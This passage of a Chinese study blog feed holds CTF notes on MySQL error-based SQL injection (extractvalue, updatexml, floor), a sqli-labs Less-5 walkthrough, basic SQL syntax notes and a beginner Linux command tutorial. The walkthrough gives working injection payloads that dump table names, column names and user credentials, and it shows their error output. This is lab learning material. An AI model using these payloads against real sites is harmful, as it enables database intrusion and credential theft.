&#x27;~security~&#x27;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-updatexml-报错注入（XML-函数：非法更新）"><a href="#3-updatexml-报错注入（XML-函数：非法更新）" class="headerlink" title="3. updatexml 报错注入（XML 函数：非法更新）"></a>3. updatexml 报错注入（XML 函数：非法更新）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml_document, xpath_expr, new_value)</span><br></pre></td></tr></table></figure><p>xml_target:xml⽂档，随便填写 </p><p>xpath_expr:关键注⼊点，填⼊查询语句 </p><p>new_value：随意填</p><ul><li><p><strong>核心逻辑</strong>：和<code>extractvalue</code>类似，<code>updatexml</code>本是修改 XML 数据的函数，同样要求第二个参数是合法 XML 路径；传非法格式就会报错，泄露拼接的数据。</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br></pre></td></tr></table></figure></li><li><p>报错效果</p><p>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure></li></ul><h5 id="3-种方法区别"><a href="#3-种方法区别" class="headerlink" title="3 种方法区别"></a>3 种方法区别</h5><table><thead><tr><th>方法</th><th>原理</th><th></th><th>缺点</th></tr></thead><tbody><tr><td>floor</td><td>临时表主键冲突</td><td></td><td>语句长，要嵌套子查询</td></tr><tr><td>extractvalue</td><td>XML 路径非法</td><td></td><td>能泄露的数据长度有限（约 32 位）</td></tr><tr><td>updatexml</td><td>XML 路径非法</td><td></td><td>同样有长度限制</td></tr></tbody></table><h5 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h5><ol><li><p><strong>用<code>0x7e</code>（~）做分隔符</strong>：避免数据和报错自带内容混淆，一眼就能找到目标（比如<code>~security~</code>）；</p></li><li><p>长度不够怎么办</p><p>：如果数据太长（比如表名多），用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr()</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,substr(database(),1,10),0x7e))--+</span><br></pre></td></tr></table></figure><p>（<code>substr(数据, 起始位置, 长度)</code>，分段获取长数据）；</p><p><strong>什么时候用报错注入</strong>：页面没有正常回显（比如联合查询看不到结果），但会显示 SQL 错误信息时，直接用！</p><p>库解释意思系统：</p><p>1.information_schema库：信息数据库<br>例如：数据库名，数据库表，表字段（单词组成的格式）的数据类型与访问权限。<br>2.SCHEMATA表：提供MySQL实例中所有数据库信息<br>show databases 结果来源此表<br>3.TABLES表：提供关于数据中表的信息<br>4.COLUMNS表：提供表中列信息，详细描述某张表的所有列以及每个列信息</p><p>mysql库：MySQL的核心数据库<br>储存 数据库的用户，权限设置，关键字<br>performance_schema库：内存数据库<br>sys库：可以查询谁使用最多的资源、哪张表被访问最多</p><h5 id="MySQL（数据库系统）结构"><a href="#MySQL（数据库系统）结构" class="headerlink" title="MySQL（数据库系统）结构"></a>MySQL（数据库系统）结构</h5><p>MySQL（数据库系统）<br>│<br>├── information_schema（系统库）<br>│     ├── tables（表信息，表）<br>│     ├── columns（字段信息，表）<br>│     └── schemata（所有数据库名，表）<br>│<br>├── pikachu（你创建的库）<br>│     ├── users（表）<br>│     │     ├── id（列）<br>│     │     ├── username（列）<br>│     │     └── password（列）<br>│     │<br>│     └── messages（表）<br>│           ├── id（列）<br>│           └── content（列）<br>│<br>├── ctftraining（比赛库）<br>│     └── flag（表）<br>│           └── flag（列）<br>│                └── ‘flag{xxx}’ （数据）<br>│<br>└── 其他数据库……</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select group_concat(table_name)<br>from information_schema.tables<br>where table_schema&#x3D;database()),0x7e))–+</p><p>?<strong>id</strong>&#x3D;<strong>1%27%20and%20extractvalue(1,concat(0x7e,(select</strong> group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))–+</p><h3 id="sqli-5题解"><a href="#sqli-5题解" class="headerlink" title="sqli-5题解"></a>sqli-5题解</h3><p>对于怎样输入都没有回显位的题目，考虑[报错注入]，这样我们就可以通过报错和获取信息</p><p>1.判断有无注入点 </p><p>?id&#x3D;1 ?id&#x3D;1’ ，两个页面返回不一样，说明没有过滤<code>&#39;</code>,存在注入点</p><p>2.判断注入类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//判断字符型</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">//判断数字型      </span><br><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure><p>3.判断有几个字段</p><p>（为什么要判断，因为要让数据库允许你插入，就要让你自己的select列数&#x3D;原始后台select列数</p><p>像这样：</p><p>【原始查询】     SELECT a, b, c FROM xxx<br>【你注入的查询】 UNION SELECT x, y, z）</p><p>?id&#x3D;1’ order by 3–+</p><p>?id&#x3D;1’ order by 4–+</p><p>4.确定回显位</p><p>?id&#x3D;-1’ union select 1,2,3–+</p><p>发现没有报错，也没回显，用报错注入</p><p>5.报表名(必须写0x7e，~在语法里面是另外一种意思)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br></pre></td></tr></table></figure><p>6.报列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e))--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure><p>7.报具体数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username,&#x27;~&#x27;,password) from users</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e))--+</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: <span class="string">&#x27;~Dumb~Dumb,Angelina~I-kill-you,D&#x27;</span></span><br></pre></td></tr></table></figure><p>① 查库：<br>UNION SELECT 1,2,GROUP_CONCAT(schema_name)<br>FROM information_schema.schemata–</p><p>② 查表：<br>UNION SELECT 1,2,GROUP_CONCAT(table_name)<br>FROM information_schema.tables<br>WHERE table_schema&#x3D;DATABASE()–</p><p>③ 查字段：<br>UNION SELECT 1,2,GROUP_CONCAT(column_name)<br>FROM information_schema.columns<br>WHERE table_schema&#x3D;’xxx’ AND table_name&#x3D;’yyy’–</p><p>④ 查数据：<br>UNION SELECT 1,2,GROUP_CONCAT(col)<br>FROM xxx.yyy–</p><p>1.注释：<br>–空格     </p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>2.列出所有数据库：<br>show databases；<br>3.查看某一数据库中的所有表<br>use 哪一个库；<br>1.use mysql；<br>show tables；<br>2.show tables from mysql;<br>3.select函数<br>select now（）；<br>查看时间<br>select databases（）；<br>查看当前选择的库<br>select user（）<br>查看当前登录数据库的用户</p><p>sql通用语法<br>1.分号结尾<br>2.不区分大小写<br>3.注释：单行：–或#<br>多行：&#x2F;<em>内容</em>&#x2F;</p><p>sql分类<br>ddl                definition定义数据库对象<br>dml      data manipulation  language 对数据库里数据增删改<br>dql               query  查询表中记录<br>dcl                control 控制创建数据库用户和权限</p><h3 id="ddl"><a href="#ddl" class="headerlink" title="ddl"></a>ddl</h3><p>1.查询<br>当前数据库<br>SELECT DATABASE();<br>所有数据库<br>SHOW DATABASES;<br>2.创建<br>CREATE DATABASE [IF NOT EXITS] 数据库名 [DEFAULT CHARCET字符集] [COLLATE排序规则];<br>3.删除<br>DROP DATABASE [IF EXISTS] 数据库名;<br>4.使用<br>USE 数据库名;</p><p><strong>ddl 表操作 查询</strong></p><p>1.查询当前数据库所有表<br>SHOW TABLES;<br>2.查询表结构<br>DESC 表名；<br>3.查询指定的建表语句<br>SHOW CREATE TABLE表名；</p><p><strong>ddl 表操作 创建</strong></p><p>CREATE TABLE 表名（<br>字段1 字段1类型 [COMMENT 字段1注释],<br>字段2 字段2类型 [COMMENT 字段2注释],<br>字段3 字段3类型 [COMMENT 字段3注释],<br>…….<br>字段n 字段n类型 [COMMENT 字段n注释]<br>)[COMMENT 表注释]；<br>备注：[..]为可选参数，最后一个字段没有逗号</p><p><strong>ddl 表操作 数据操作</strong><br>1.三种：数值类型，字符串类型，日期时间类型<br>2.数值类型：<br>TINYINT小整数值 1<br>SMALLINT大整数值 2<br>MEDIUMINT 3<br>INT INTERGER 4<br>BIGINT极大整数值 8<br>FLOAT单精度浮点型 4<br>DOUBLE双精度 8<br>DECIMAL小数值</p><p>字符串类型<br>定长字符串CHAR<br>变长字符串VARCHAR</p><p>不超过255个字符的二进制数据TINYBLOB<br>二进制形式的长文本数据BLOB</p><p>二进制形式的中等长度文本数据MEDIUMBLOB<br>二进制形式的中等长度文本数据MEDIUMBLOB</p><p>二进制形式的极大文本数据LONGBLOB</p><p>短文本字符串TINYTEXT</p><p>中等长度文本数据DEDIUMTEXT</p><p>长文本数据TEXT</p><p>极大文本数据LONGTEXT</p><p><strong>ddl 表操作 修改</strong><br>1.添加字段<br>ALTER TABLE 表名 ADD 字段名 类型（长度） [COMMENT注释] [约束]；<br>例子：<br>ALTER TABLE EMP ADD NICKNAME VARCHAR(20);<br>2.修改数据类型<br>ALTER TABLE 表名 MODIFY 字段名 新数据类型（长度）；<br>3.修改字段名和字段类型<br>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型（长度) [COMMENT注释] [约束]；<br>例子：<br>ALTER TABLE EMP CHANGE NICKNAME USERNAME VARCHAR(30) COMMENT ‘昵称’；<br>4.删除字段<br>ALTER TABLE 表名 DROP 字段名 ;<br>例子：<br>ALTER TABLE EMP DROP USERNAME;<br>5.<br>删除表<br>DROP TABLE [IF EXISTS] 表名;</p><p>删除指定表，并重新创建该表<br>TRUNCATE TABLE 表名；</p><h3 id="dml数据操作语言"><a href="#dml数据操作语言" class="headerlink" title="dml数据操作语言"></a><strong>dml数据操作语言</strong></h3><p><strong>添加数据INSERT</strong></p><p>1.给指定字段添加数据<br>INSERT INTO 表名（字段名1，字段名2..）VALUES (值1，值2….)；<br>2.给全部字段添加数据<br>INSERT INTO 表名 VALUES (值1，值2….)；<br>3.批量添加数据<br>INSERT INTO 表名（字段名1，字段名2..）VALUES (值1，值2….)，(值1，值2….)，(值1，值2….)；<br>INSERT INTO 表名 VALUES (值1，值2….)，(值1，值2….)，(值1，值2….)；</p><p>注意：<br>插入数据时，指定的字段顺序需要与值的顺序一一对应<br>字符串和日期型数据应该包含在引号中<br>插入的数据大小，应该在字段的规定范围内</p><p><strong>修改数据UPDATE</strong><br>UPDATE 表名 SET 字段1&#x3D;值1，字段2&#x3D;值2，…[WHERE 条件]；<br>修改语句的条件可选，如果没有，修改整张表的数据<br>举例：<br>1.<br>UPDATE EMPLOYEE SET NAME &#x3D; ‘tyq’ WHERE ID &#x3D; 1;<br>2.<br>UPDATE EMPLOYEE SET NAME &#x3D; ‘TYQ’,GENDER &#x3D; ‘女’ WHERE ID &#x3D; 1;<br>3.<br>UPDATE EMPLOYEE SET ENTRYDATE &#x3D; ‘2008.8.8’;</p><p><strong>删除数据DELETE</strong><br>DELETE FFROM 表名 [ WHERE 条件]<br>注意：<br>1.delete语句条件可选，若没有删除整张表<br>2.delete语句不能删除某个特定的值（可以使用update）<br>举例：<br>DLEETE FROM EMPLOYEE WHERE GENDER &#x3D; ‘女’;<br>DELETE FROM EMPLOYEE;</p><h3 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h3><p>dql语法：<br>SELECT<br>字段列表<br>FROM<br>表明列表<br>WHERE<br>条件列表<br>GROUP BY<br>分组字段列表<br>HAVING<br>分组后条件列表<br>ORDER BY<br>排序字段列表<br>LIMIT<br>分页参数</p><p>dql基本查询<br>1.查询多个字段<br>SELECT 字段1，字段2，字段n FROM 表名；<br>举例：<br>SELECT NAME,AGE FROM EMP;</p><p>SELECT * FROM 表名；<br>2.设置别名<br>SELECT 字段1 [AS别名1]，字段2 [AS 别名2] … FROM 表名；<br>举例：<br>SELECT WORKADDRESS AS ‘工作地址’ FROM EMP;<br>3.去除重复记录<br>SELECT DISTINCT 字段列表 FROM 表名；</p><p>DQL条件查询<br>1.语法：<br>SELECT 字段列表 FROM 表名 WHERE 条件列表；<br>2.条件：<br>比较运算符</p><blockquote><p>&lt; &#x3D; &lt;&#x3D; &gt;&#x3D;<br>&lt;&gt;或!&#x3D; 不等于<br>BETWEEN…AND…  在某个范围内（取两边）<br>IN(…)               在in后面列表中的值，多选一？<br>LIKE 占位符    模糊匹配（_匹配单个字符，%匹配任意个字符）<br>IS NULL        是NULL（没有数据状态）<br>逻辑运算符<br>AND 或&amp;&amp;     并且<br>OR 或||            或<br>NOT 或!          非  </p></blockquote><p>举例：<br>SELECT * FROM EMP WHERE AGE &#x3D; 88;<br>SELECT * FROM EMP WHERE AGE &lt;&gt;20;<br>SELECT * FROM EMP WHEAR IDCARD IS NULL;<br>SELECT * FROM EMP WHEAR IDCARD IS NOT NULL;<br>SELECT * FROM EMP WHERE AGE &lt;&gt;20 OR AGE &gt;88;<br>SELECT * FROM EMP WHERE AGE BETWEEN  15 AND 88;<br>SELECT * FROM EMP WHERE GENDER &#x3D; ‘女’ AND AGE &lt; 25;<br>SELECT * FROM EMP WHERE AGE IN (18,25,40);<br>SELECT * FROM EMP WHERE NAME LIKE  ‘_ _ _’;<br>SELECT * FROM EMP WHERE IDCARD LIKE ‘%X’; # %表示多个字符，%x表示最后一个字符为X</p><p>dql聚合函数<br>1.将一列数据作为一个整体，进行纵向计算<br>2.常见聚合函数<br>COUNT统计数量<br>SELECT COUNT (*) FROM EMP;<br>SELECT COUNT(IDCARD) FROM EMP;<br>MAX最大值<br>SELECT MAX(AGE) FROM EMP;<br>MIN最小值<br>AVG平均值<br>SELECT (AGE) FROM EMP;<br>SUM求和<br>SELECT SUM(AGE) FROM EMP WHERE WORKADDRESS &#x3D; ‘西安’;<br>3.语法：<br>SELECT 聚合函数(字段列表) FROM 表名;<br>4.注意：<br>null值不参加聚合函数运算</p><p>dql 分组查询<br>1.语法:<br>SELECT 分组字段 聚合函数 FROM 表名 [WHERE 表名] GROUP BY 分组字段名 [HAVING 分组后过滤条件] ；<br>where和having区别：<br>1.分组之前进行过滤，不满足where条件不进行分组<br>2.判断条件不同：where不能对聚合函数进行判断，having可以<br>3.执行顺序：where&gt;聚合函数&gt;having</p><p>1<br>SELECT GENDER,COUNT(<em>) FROM EMP GROUP  BY GENDER ;<br>SELECT GENDER,AVG(AGE) FROM EMP GRUOP BY GENDER;<br>SELECT WORKADDRESS,COUNT(</em>) FROM EMP WHERE AGE&lt;45 GROUP BY WORKADDRESS HAVING COUNT(*) &gt;&#x3D;3;</p><p>dpl排序查询<br>1.语法：<br>SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1，字段2 排序方式2；<br>2.排序方式<br>ASC升序（默认值）<br>DESC降序<br>先按照排序1进行排序，若相同则按照排序方式2<br>举例：<br> SELECT * FROM EMP ORDER BY AGE ASC;<br>SELECT * FROM EMP ORDER BY TIME DESC;<br>SELECT * FROM EMP ORDER BY AGE, TIME DESC ;</p><p>dql 分页查询<br>1.语法：<br>SELECT 字段列表 FROM 表名 LIMIT 起始索引，查询返回记录数；<br>注意：<br>1.起始索引从0开始<br>起始索引 &#x3D; （查询页码-1）*每页显示记录数<br>2.分页查询：不同数据库有不同的语法，mysql是limit<br>3.如果查询的是第一页数据，起始索引可以省<br>直接写：limit 10<br>举例：<br>SELECT * FROM EMP LIMIT 10;<br>SELECT * FROM EMP LIMIT 10,10;</p><p>案例：<br>SELECT * FROM EMP WHERE GENDER &#x3D; ‘女’  AND AGE IN (20,21,22,23);<br>SELECT * FROM EMP WHERE GENDER &#x3D; ‘男’ AND (AGE ;BETWEEN 20 AND 40 ) AND NAME LIKE ‘___’;<br>SELECT  GENDER,COUNT(*) FROM EMP WHERE AGE &lt;60 GROUP BY GENDER;<br>SELECT NAME,AGE FROM EMP WHERE AGE&lt;&#x3D;35 ORDER BY AGE ASC,TIME ASC;<br>SELECT * FROM EMP WHERE GENDER &#x3D; “女” AND AGE BETWEEN 20 AND 40 ORDER BY AGE,TIME ASC LIMIT 5;</p><p>dql 顺序<br>编写顺序：<br>SELECT<br>字段列表   &#x2F;&#x2F;「字段」&#x3D; Excel 里的「列名」<br>&#x2F;&#x2F; 字段列表 &#x3D; 列名集合</p><p>FROM<br>表明列表<br>WHERE<br>条件列表<br>GROUP BY<br>分组字段列表<br>HAVING<br>分组后条件列表<br>ODER BY<br>排序字段列表<br>LIMIT<br>分页参数</p><p>执行顺序和这个不同</p><p>DCL</p><p>1.用户管理（谁可以访问mysql数据库）<br>1.1创建用户<br>CREATE USER ‘用户名‘@’主机名’ IDENTIFIED BY ‘密码’;<br>1.2修改用户密码<br>ALTER USER ‘用户名‘@’主机名’ IDENTIFIED WITH mysql_native_password BY ‘密码’;<br>1.3删除用户<br>DROP USER ‘用户名‘@’主机名’；</p><p>2.权限控制（可以访问啥，并对他们可以做哪些操作）<br>2.1授权<br>GRANT 权限列表 ON 数据库.表名 TO ‘用户名‘@’主机名’;<br>2.2撤销权限<br>REMOVE 权限列表 ON 数据库名.表名 FROM ‘用户名‘@’主机名’;</p><p>函数<br>1.字符串函数<br>CONCAT字符串拼接</p><p>​concat_ws(‘;’,username,passwd,…..)  &#x2F;&#x2F;分隔符放最前面</p><p>LOWER改为小写<br>UPPER改为大写<br>LPAD左填充<br>RPAD右填充<br>TRIM去除左右两边空格，不包括中间<br>SUBSTRING字符串截取<br>2.数值函数 需补充<br>3.日期函数<br>CUEDATE获取当前日期<br>CURTIME获取当前时间<br>NOW获取curtime和curdate<br>YEAR MONTH DAY获取所需的东东<br>DATE_ADD 添加时间周期<br>DATAIFF 计算两个日期相减<br>4.流程函数 需补充 </p>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux指令</title>
      <link href="/posts/fc98257.html"/>
      <url>/posts/fc98257.html</url>
      
        <content type="html"><![CDATA[<h2 id="linux指令"><a href="#linux指令" class="headerlink" title="linux指令"></a>linux指令</h2><p><strong>1.通用格式：command [-options] [parameter]</strong></p><p>1.command：命令本身</p><p>2.-options：命令选项，可控制命令的行为细节（可选）</p><p>3.parameter：命令参数，用于命令的指向目标（可选）</p><p>实例：</p><p>*ls -l&#x2F;home&#x2F;itheima </p><p> 以列表的形式，显示&#x2F;home&#x2F;itheima目录内的内容</p><p>*cp -r test1 test2</p><p><strong>2.ls命令的参数和选项</strong></p><p>1.ls命令的参数</p><p>作用：指定查看文件夹（目录）的内容</p><p>若不给参数，查看的是 当前工作目录 的内容</p><p>&#x2F; ：根目录</p><p>2.ls命令的选项j</p><p>-a （all）展示隐藏内容（以.开头文件默认被隐藏，要用-a显示）</p><p>-l  以列表形式展示，并展示更多细节</p><p>-h 需和-l搭配用，人性化显示文件大小单位</p><p>命令的选项组合使用</p><p>例：ls-lah  &#x3D;  ls -a -l -h</p><p><strong>3.cd pwd 命令</strong></p><p>1.cd：change directory</p><p>语法：cd [Linux路径]</p><p>cd无选项，只有参数，表示要切换到哪个目录下</p><p>cd直接执行，不写参数，表示回到用户的home目录s</p><p><img src="/images/image-20260121191957243.png" alt="image-20260121191957243"></p><p><img src="/images/image-20260121192021098.png" alt="image-20260121192021098"></p><p>2.pwd命令（print work directory）</p><p>直接用ls验证不恰当，用pwd查看当前的工作目录</p><p>语法：pwd （无需选项和参数，直接输入即可）</p><p><strong>4.相对路径 绝对路径 特殊路径符</strong></p><p>cd &#x2F;home&#x2F;itheima&#x2F;desktop 绝对路径：以根目录为起点  有&#x2F;</p><p>cd desktop              相对路径：以当前目录为起点 无&#x2F;</p><p>特殊路径符</p><p>.  表示当前目录</p><p>.. 表示上一级目录</p><p>~ 表示home目录</p><p><img src="/images/$2" alt="$1"></p><p><strong>5.创建目录命令</strong></p><p><strong>mkdir</strong>命令（make directory）</p><p>语法：mkdir [-p] linux路径</p><p>1.参数必填，相对&#x2F;绝对路径均可</p><p>2.-p可选填，表示自动创建不存在的父目录，是用于创建连续多层次的目录</p><p>例子：</p><p>mkdir bigtest</p><p>ls</p><p>mkdir &#x2F;home&#x2F;bigtest&#x2F;test1</p><p>ls</p><p>mkdir .&#x2F;test2</p><p>ls</p><p>cd Desktop</p><p>pwd</p><p>mkdir ..&#x2F;test3</p><p>cd ..</p><p>ls</p><p>mkdir ~&#x2F;test4</p><p>ls</p><p><img src="/images/image-20260121192125053.png" alt="image-20260121192125053"></p><p>3.创建文件夹要保证操作都在home内，超出无权限</p><p><strong>6.touch cat more 命令</strong></p><p><strong>题外话：CTRL+l  清空屏幕</strong></p><p>touch命令 创建文件</p><p>1.无选项，参数必填（路径），绝对、相对、特殊路径均可使用</p><p>cat命令 查看文件内容</p><p>语法：cat Linux路径</p><p>1.无选项，参数必填（被查看文件路径），绝对、相对、特殊路径均可使用</p><p>more命令 查看文件内容</p><p>语法：more Linux路径</p><p>1.无选项，参数必填（被查看文件路径），绝对、相对、特殊路径均可使用</p><p>2.与cat不同的是：</p><p>cat直接将内容全部显示出来</p><p>more支持翻页（通过空格翻页，通过q退出），若内容过多，可一页一页展示</p><p><strong>7.cp mv rm 命令</strong></p><p><strong>cp复制文件&#x2F;文件夹 copy</strong></p><p>语法：cp [-r] 参数1 参数2</p><p>1.-r选项，可选，用于复制文件夹使用，表示递归</p><p>2.参数1：Linux路径，表示被复制文件或文件夹</p><p>3.参数2：Linux路径，表示要复制去哪</p><p><strong>mv移动文件&#x2F;文件夹 move</strong></p><p>语法：mv 参数1 参数2</p><p>1.参数1：路径，表示被移动的文件&#x2F;文件夹</p><p>2.参数2：表示要移动去的地方。若目标不存在，则将参数1进行改名，以确保目标存在</p><p><strong>rm删除文件&#x2F;文件夹 remove</strong></p><p>语法：rm [-r -f] 参数1 参数2 ……参数N</p><p>1.-r用于删除文件夹。-f表示force，强制删除（不会弹出提示确认信息）</p><p> 普通用户删除内容不会弹出提示，只有root管理员用户删除才会有</p><p>2.参数1、参数2……参数N 表示要删除的文件或文件夹路径，按照空格隔开</p><p><strong>rm删除文件&#x2F;文件夹-通配符</strong></p><p>rm命令支持通配符*，用来做模糊匹配</p><p>1.符号*表示通配符，即匹配容易内容（包括空）</p><p>例子：</p><p>test*，表示匹配任何以test开头的内容</p><p>*test，表示匹配任何以test结尾的内容</p><p><em>test</em>，表示匹配任何包含test的内容</p><p><img src="/images/image-20260121192233605.png" alt="image-20260121192233605"></p><p><strong>7.which find命令</strong></p><p>which命令</p><p>语法：which 要查找的命令</p><p>find命令-按文件名查找文件</p><p>语法：find 起始路径 -name ‘’被查找文件名’’</p><p>find命令-通配符</p><p>同上</p><p>find命令-按文件大小查找文件</p><p>语法：find 起始路径 -size +&#x2F;-n[kMG]</p><p>1.+、-表示 大于、小于</p><p>2.n表示大小数字</p><p>3.kMG表示大小单位，k（小写）表示kb，M表示MB，G表示GB</p><p>例子：find &#x2F; -size &#x3D;100k</p><p>题外话：CTRL+c 表示停止</p><p><strong>8.echo，tail，重定向符</strong></p><p>echo</p><p>语法：echo 输出内容</p><p>1.相当于print</p><p>2.复杂内容用“”</p><p>反引号  </p><p>无需选项，只有一个参数（表示要输出的内容，复杂内容可以用双引号包括）</p><p>作用：包围的内容作为命令去执行，而不是普通内容</p><p>例子：echo pwd  &#x2F;&#x2F;输出pwd</p><p>echo <code>pwd</code></p><p>行使命令</p><p>重定向符&gt;和&gt;&gt;</p><p>&gt;   将左侧命令的结果，覆盖写入到符号右侧指定文件中</p><p>&gt;&gt; 将左侧命令结果，追加写入到符号右侧指定文件中</p><p><strong>9.tail命令</strong></p><p>作用：查看文件尾部内容，跟踪文件的最新更改</p><p>语法：tail [-f -num] Linux路径</p><p>参数：表示Linux路径，表示被跟踪的文件</p><p>选项：-f，表示持续跟踪</p><p>选项：num，表示查看尾部多少行，不填默认10行</p><p><strong>10.grep命令</strong></p><p>语法： grep [-n] 关键字 文件路径</p><p>1.选项-n 可选 ，表示在结果中显示匹配的行的行号</p><p>2.参数，关键字，必填，表示过滤的关键字，若带有空格等其他特殊符号，建议使用“”</p><p>3.参数， 文件路径，必填，表示要过滤内容的文件路径，可作为内容输入端口</p><p><strong>10.wc命令 做数量统计</strong></p><p>1.语法： wc [-c -m -l -w] 文件路径</p><p>2.选项：</p><p>-c 统计bytes数量</p><p>-m 统计字符数量</p><p>-l 统计行数</p><p>-w 统计单词数量</p><p>3.参数：文件路径，被统计的文件，可作为内容输入端口</p><p><strong>12.管道符|</strong></p><p>1.含义：将管道符左边的命令结果，作为右边命令的输入</p><p>例子：</p><p>cat tes.text | grep f</p><p>cat tes.text | grep f | grep u</p><p>ls | grep test</p><p><strong>13.vi vim 编辑器</strong></p><p>1.使用命令：</p><p>vim 文件路径</p><p>若存在，打开；不存在，创建</p><p>2.命令：</p><p>i 在当前光标位置进入输入模式</p><p>a 在当前光标位置后，进入输入模式</p><p>I 在当前开进入输入模式</p><p>A 在当前行结尾，进入输入模式</p><p>o 当前光标下一行进入命令模式</p><p>O 当前光标上一行进入输入模式</p><p>esc 返回命令模式</p><p><img src="/images/image-20260121192314419.png" alt="image-20260121192314419"></p><p>快捷键</p><p><img src="/images/image-20260121192333909.png" alt="image-20260121192333909"></p><p><img src="/images/image-20260121192349191.png" alt="image-20260121192349191"></p><p>底线命令模式：</p><p>:wq保存并退出</p><p>:q退出</p><p>:q!强制退出</p><p>:w保存</p><p>:set nu显示行号</p><p>:set paste设置粘贴模式</p><p><strong>13.用户和权限</strong></p><p>1.超级管理员：root</p><p>进入格式：</p><p>su - root </p><p> 普通：在自己home内有权限</p><p>su命令</p><p>语法：su - 用户名</p><p>1.符号可选，建议带上</p><p>2.用户名省略表示切换到root</p><p>3.切换后，可以通过exit 或者 CTRL+d退回上一个用户</p><p>sudo命令</p><p>1.长时间使用root会有破坏，所以我们用sudo作为临时普通授权</p><p>2.语法：</p><p>sudo 其他命令</p><p><strong>14.用户和用户组管理</strong></p><p>用户组管理：</p><p>1.以下命令需要root用户执行</p><p>2.创建用户组：</p><p>groupadd 用户组名</p><p>3.删除</p><p>groupdel</p><p>15.用户管理：</p><p>1.创建用户：</p><p>useradd [-g -d] 用户名</p><p>-g：指定用户的组，不用会自动创建同名组</p><p>如果已经有同名组，必须使用-g</p><p>-d：指定用户home路径，不指定home’目录默认在：&#x2F;home&#x2F;用户名</p><p>2.删除</p><p>usedel [-r] 用户名</p><p>-r 删除用户的home目录，不使用不删除</p><p>3.查看用户所属组</p><p>id [用户名]</p><p>4修改用户所属组</p><p>usermod -aG 用户组 用户名</p><p>3.getent命令</p><p>1.可以查看当前系统中有哪些用户</p><p>语法：getent passwd</p><p>用户名：密码（x）：用户id：组id：描述信息（无用）</p><p>：home目录：执行终端（默认bash）</p><p>2.可以查看当前系统中有哪些组</p><p>语法：getent group</p><p>组名称：组认证（显示为x）：组id</p><p>认知权限信息</p><p>通过ls-l 可以以列表形式查看内容，并显示权限细节</p><p>1.权限细节</p><p>权限细节共10个槽位</p><p>举例：drwxr-xr-x</p><p>-&#x2F;d&#x2F;l r&#x2F;- w&#x2F;- x&#x2F;- r&#x2F;- w&#x2F;- x&#x2F;- r&#x2F;- w&#x2F;- x&#x2F;-</p><p>​     用户权限    用户组权限  其他用户权限</p><p>第一槽位中：</p><p>d表示文件夹</p><p>l表示软链接</p><p>-表示文件</p><p>后续槽位中：</p><p>-表示无权限</p><p>r：read读权限（查看）</p><p>w：write写权限（文件：修改）（文件夹：创建 删除 改名）</p><p>x：执行权限（文件：可以将文件作为执行程序 ）（文件夹：可以更改工作目录到此文件夹，即 cd进入）</p><p>chmod修改权限信息（只有文件文件夹的所属用户或root可以修改）</p><p>1.语法：chmod [-R] 权限 文件或文件夹</p><p>举例：</p><p>chmod u&#x3D;rmx,g&#x3D;rx,o&#x3D;x hello.txt</p><p>（其中：u表示user所属用户权限，g表示group组权限，o表示other其他用户权限）</p><p>chmod -R 